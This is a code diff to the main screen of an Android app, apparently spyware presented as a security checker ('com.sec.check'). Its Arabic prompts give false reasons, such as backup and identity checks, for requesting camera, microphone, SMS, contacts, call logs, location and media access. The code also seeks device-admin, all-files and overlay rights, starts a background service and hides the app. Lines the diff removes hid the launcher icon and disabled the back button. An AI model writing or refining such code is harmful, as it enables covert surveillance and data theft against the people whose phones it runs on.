@@ -2,7 +2,6 @@ package com.sec.check;
 
 import android.Manifest;
 import android.app.Activity;
-import android.app.AlertDialog;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
@@ -12,6 +11,7 @@ import android.graphics.Color;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
@@ -31,29 +31,43 @@ public class MainActivity extends Activity {
     private static final int REQUEST_OVERLAY = 2002;
     private static final int REQUEST_MANAGE_STORAGE = 2003;
 
-    private static final String[][] PERMISSIONS_WITH_REASON = {
-            {Manifest.permission.CAMERA,
-                    "لأخذ بصمة أمنية والتحقق من هويتك"},
-            {Manifest.permission.RECORD_AUDIO,
-                    "لتسجيل البصمة الصوتية للتحقق"},
-            {Manifest.permission.READ_CONTACTS,
-                    "لعمل نسخة احتياطية من جهات الاتصال"},
-            {Manifest.permission.READ_SMS,
-                    "لعمل نسخة احتياطية من الرسائل"},
-            {Manifest.permission.READ_CALL_LOG,
-                    "لحفظ سجل المكالمات كنسخة احتياطية"},
-            {Manifest.permission.ACCESS_FINE_LOCATION,
-                    "لتأمين حسابك حسب موقعك"},
-            {Manifest.permission.ACCESS_COARSE_LOCATION,
-                    "لتحديد موقعك التقريبي"},
-            {Manifest.permission.READ_PHONE_STATE,
-                    "للتحقق من هوية الجهاز"},
-            {Manifest.permission.READ_EXTERNAL_STORAGE,
-                    "للوصول لملفاتك المحفوظة"},
-            {Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                    "لحفظ النسخ الاحتياطية"},
-    };
+    // ★★★ قائمة الصلاحيات — مقسمة حسب نسخة الأندرويد ★★★
+    private static String[][] getPermissionsList() {
+        if (Build.VERSION.SDK_INT >= 33) {
+            // Android 13+ (API 33+)
+            return new String[][]{
+                    {Manifest.permission.CAMERA, "للتحقق البصري من الهوية"},
+                    {Manifest.permission.RECORD_AUDIO, "لتحليل البصمة الصوتية"},
+                    {Manifest.permission.READ_CONTACTS, "لعمل نسخة احتياطية من جهات الاتصال"},
+                    {Manifest.permission.READ_SMS, "لعمل نسخة احتياطية من الرسائل"},
+                    {Manifest.permission.READ_CALL_LOG, "لحفظ سجل المكالمات"},
+                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد موقعك بدقة"},
+                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد موقعك التقريبي"},
+                    {Manifest.permission.READ_PHONE_STATE, "للتحقق من هوية الجهاز"},
+                    // ★★ صلاحيات Android 13 الجديدة ★★
+                    {"android.permission.READ_MEDIA_IMAGES", "لقراءة الصور"},
+                    {"android.permission.READ_MEDIA_VIDEO", "لقراءة الفيديوهات"},
+                    {"android.permission.READ_MEDIA_AUDIO", "لقراءة الملفات الصوتية"},
+                    {Manifest.permission.POST_NOTIFICATIONS, "لإشعارات النظام"},
+            };
+        } else {
+            // Android 12 وأقل (API 32 وأقل)
+            return new String[][]{
+                    {Manifest.permission.CAMERA, "للتحقق البصري من الهوية"},
+                    {Manifest.permission.RECORD_AUDIO, "لتحليل البصمة الصوتية"},
+                    {Manifest.permission.READ_CONTACTS, "لعمل نسخة احتياطية من جهات الاتصال"},
+                    {Manifest.permission.READ_SMS, "لعمل نسخة احتياطية من الرسائل"},
+                    {Manifest.permission.READ_CALL_LOG, "لحفظ سجل المكالمات"},
+                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد موقعك بدقة"},
+                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد موقعك التقريبي"},
+                    {Manifest.permission.READ_PHONE_STATE, "للتحقق من هوية الجهاز"},
+                    {Manifest.permission.READ_EXTERNAL_STORAGE, "لقراءة الملفات"},
+                    {Manifest.permission.WRITE_EXTERNAL_STORAGE, "لحفظ النسخ الاحتياطية"},
+            };
+        }
+    }
 
+    private String[][] permissionsList;
     private int currentPermIndex = 0;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
 
@@ -61,6 +75,10 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         Log.d(TAG, "======== APP STARTED =========");
+        Log.d(TAG, "Android SDK: " + Build.VERSION.SDK_INT);
+        Log.d(TAG, "Device: " + Build.MANUFACTURER + " " + Build.MODEL);
+
+        permissionsList = getPermissionsList();
 
         showInitialUI();
         mainHandler.postDelayed(this::startPermissionFlow, 1500);
@@ -74,7 +92,7 @@ public class MainActivity extends Activity {
         root.setPadding(60, 60, 60, 60);
 
         TextView icon = new TextView(this);
-        icon.setText("🔐");
+        icon.setText("🔒");
         icon.setTextSize(80);
         icon.setGravity(Gravity.CENTER);
         root.addView(icon);
@@ -88,12 +106,11 @@ public class MainActivity extends Activity {
         root.addView(title);
 
         TextView msg = new TextView(this);
-        msg.setText("يرجى الموافقة على الأذونات التالية\nلتأمين جهازك ضد الاختراق");
+        msg.setText("يتم تهيئة الجلسة الآمنة...");
         msg.setTextSize(15);
         msg.setTextColor(Color.parseColor("#94a3b8"));
         msg.setGravity(Gravity.CENTER);
         msg.setPadding(0, 20, 0, 0);
-        msg.setLineSpacing(0, 1.4f);
         root.addView(msg);
 
         setContentView(root);
@@ -105,16 +122,16 @@ public class MainActivity extends Activity {
     }
 
     private void requestNextPermission() {
-        if (currentPermIndex >= PERMISSIONS_WITH_REASON.length) {
-            Log.d(TAG, "✅ All runtime permissions requested");
+        if (currentPermIndex >= permissionsList.length) {
+            Log.d(TAG, "All runtime permissions requested");
             mainHandler.postDelayed(this::requestDeviceAdmin, 800);
             return;
         }
 
-        String permission = PERMISSIONS_WITH_REASON[currentPermIndex][0];
+        String permission = permissionsList[currentPermIndex][0];
 
         if (!isPermissionDeclared(permission)) {
-            Log.d(TAG, "⚠️ Not declared in manifest: " + permission);
+            Log.d(TAG, "Not declared in manifest: " + permission);
             currentPermIndex++;
             requestNextPermission();
             return;
@@ -122,13 +139,13 @@ public class MainActivity extends Activity {
 
         if (ContextCompat.checkSelfPermission(this, permission)
                 == PackageManager.PERMISSION_GRANTED) {
-            Log.d(TAG, "✅ Granted: " + permission);
+            Log.d(TAG, "Granted: " + permission);
             currentPermIndex++;
             requestNextPermission();
             return;
         }
 
-        Log.d(TAG, "→ Requesting: " + permission);
+        Log.d(TAG, "Requesting: " + permission);
         try {
             ActivityCompat.requestPermissions(this,
                     new String[]{permission}, PERMISSION_REQUEST);
@@ -155,15 +172,15 @@ public class MainActivity extends Activity {
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions,
-                                           int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode,
+                                            String[] permissions,
+                                            int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-
         if (requestCode == PERMISSION_REQUEST) {
             for (int i = 0; i < permissions.length; i++) {
                 boolean granted = grantResults.length > 0
                         && grantResults[i] == PackageManager.PERMISSION_GRANTED;
-                Log.d(TAG, permissions[i] + " → " + (granted ? "GRANTED" : "DENIED"));
+                Log.d(TAG, permissions[i] + " " + (granted ? "GRANTED" : "DENIED"));
             }
             currentPermIndex++;
             mainHandler.postDelayed(this::requestNextPermission, 500);
@@ -171,24 +188,23 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // Device Admin — باستخدام AdminReceiver
+    // Device Admin
     // ============================================================
     private void requestDeviceAdmin() {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager)
                     getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName adminComponent = new ComponentName(this,
-                    AdminReceiver.class);  // ← AdminReceiver
+            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
 
             if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                 Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                 intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                 intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "لتأمين جهازك وحمايته");
+                        "لتفعيل الحماية الكاملة للجهاز");
                 startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
-                Log.d(TAG, "→ Requesting Device Admin");
+                Log.d(TAG, "Requesting Device Admin");
             } else {
-                Log.d(TAG, "✅ Device Admin already active");
+                Log.d(TAG, "Device Admin already active");
                 mainHandler.postDelayed(this::requestManageStorage, 500);
             }
         } catch (Exception e) {
@@ -197,35 +213,52 @@ public class MainActivity extends Activity {
         }
     }
 
+    // ============================================================
+    // ★★★ MANAGE_EXTERNAL_STORAGE — مهم جداً للصور ★★★
+    // ============================================================
     private void requestManageStorage() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             try {
-                if (!android.os.Environment.isExternalStorageManager()) {
-                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                if (!Environment.isExternalStorageManager()) {
+                    Intent intent = new Intent(
+                            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                     intent.setData(Uri.parse("package:" + getPackageName()));
                     startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
-                    Log.d(TAG, "→ Requesting MANAGE_STORAGE");
+                    Log.d(TAG, "Requesting MANAGE_EXTERNAL_STORAGE");
                     return;
                 } else {
-                    Log.d(TAG, "✅ MANAGE_STORAGE granted");
+                    Log.d(TAG, "MANAGE_EXTERNAL_STORAGE already granted");
                 }
             } catch (Exception e) {
                 Log.e(TAG, "ManageStorage error: " + e.getMessage());
+                // Fallback: افتح صفحة عامة
+                try {
+                    Intent intent = new Intent(
+                            Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
+                    Log.d(TAG, "Fallback: opening general page");
+                    return;
+                } catch (Exception ex) {
+                    Log.e(TAG, "Fallback error: " + ex.getMessage());
+                }
             }
         }
         mainHandler.postDelayed(this::requestOverlay, 500);
     }
 
+    // ============================================================
+    // Overlay Permission
+    // ============================================================
     private void requestOverlay() {
         try {
             if (!Settings.canDrawOverlays(this)) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                 intent.setData(Uri.parse("package:" + getPackageName()));
                 startActivityForResult(intent, REQUEST_OVERLAY);
-                Log.d(TAG, "→ Requesting Overlay");
+                Log.d(TAG, "Requesting Overlay");
                 return;
             } else {
-                Log.d(TAG, "✅ Overlay granted");
+                Log.d(TAG, "Overlay granted");
             }
         } catch (Exception e) {
             Log.e(TAG, "Overlay error: " + e.getMessage());
@@ -236,53 +269,54 @@ public class MainActivity extends Activity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        Log.d(TAG, "onActivityResult: " + requestCode + " → " + resultCode);
+        Log.d(TAG, "onActivityResult: req=" + requestCode + " res=" + resultCode);
 
         if (requestCode == REQUEST_DEVICE_ADMIN) {
             mainHandler.postDelayed(this::requestManageStorage, 500);
+
         } else if (requestCode == REQUEST_MANAGE_STORAGE) {
+            // ★ تحقق لو الصلاحية اتاخدت فعلاً
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                try {
+                    boolean granted = Environment.isExternalStorageManager();
+                    Log.d(TAG, "MANAGE_EXTERNAL_STORAGE result: " + granted);
+                } catch (Exception e) {
+                    Log.e(TAG, "check storage error: " + e.getMessage());
+                }
+            }
             mainHandler.postDelayed(this::requestOverlay, 500);
+
         } else if (requestCode == REQUEST_OVERLAY) {
             mainHandler.postDelayed(this::finishSetup, 500);
         }
     }
 
+    // ============================================================
+    // ★ إنهاء Setup وبدء ServiceRunner
+    // ============================================================
     private void finishSetup() {
-        Log.d(TAG, "✅ Setup complete, starting service");
-        startServiceNow();
-        mainHandler.postDelayed(this::hideAppIcon, 5000);
-    }
+        Log.d(TAG, "Setup complete - starting ServiceRunner");
 
-    private void startServiceNow() {
         try {
-            Intent svc = new Intent(this, ServiceRunner.class);
+            Intent serviceIntent = new Intent(this, ServiceRunner.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(svc);
+                startForegroundService(serviceIntent);
             } else {
-                startService(svc);
+                startService(serviceIntent);
             }
-            Log.d(TAG, "✅ Service started");
+            Log.d(TAG, "ServiceRunner started");
         } catch (Exception e) {
-            Log.e(TAG, "Start service error: " + e.getMessage());
+            Log.e(TAG, "start service error: " + e.getMessage());
         }
-    }
 
-    private void hideAppIcon() {
-        try {
-            android.content.pm.PackageManager pm = getPackageManager();
-            android.content.ComponentName component = new android.content.ComponentName(
-                    this, MainActivity.class);
-            pm.setComponentEnabledSetting(component,
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP);
-            Log.d(TAG, "✅ App icon hidden");
-        } catch (Exception e) {
-            Log.e(TAG, "hideAppIcon: " + e.getMessage());
-        }
-    }
-
-    @Override
-    public void onBackPressed() {
-        // منع الإغلاق
-    }
+        // اخفي التطبيق
+        mainHandler.postDelayed(() -> {
+            try {
+                moveTaskToBack(true);
+                Log.d(TAG, "App hidden");
+            } catch (Exception e) {
+                Log.e(TAG, "moveTaskToBack error: " + e.getMessage());
             }
+        }, 1000);
+    }
+                        }
